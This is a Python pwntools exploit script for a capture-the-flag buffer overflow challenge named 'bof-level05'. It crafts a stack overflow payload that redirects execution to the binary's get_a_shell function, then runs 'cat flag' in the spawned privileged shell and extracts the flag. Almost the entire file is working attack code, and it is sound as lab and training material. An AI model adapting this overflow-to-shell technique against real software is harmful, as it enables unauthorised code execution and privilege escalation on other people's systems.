from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level05') # replace this with the actual level

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript='''
    b receive_input
    continue
    ''')
else:
    io = elf.process(env={})

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
get_a_shell = p32(elf.symbols["get_a_shell"])

buf_len = 0x88
buffer_start = 0xffffdd70

our_stack =  b"A" * 4 + get_a_shell
our_stack_len = 0x8 
our_stack_addr = p32(buffer_start + buf_len - our_stack_len)

payload = (b"A" * (buf_len - our_stack_len)) + our_stack  + our_stack_addr
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
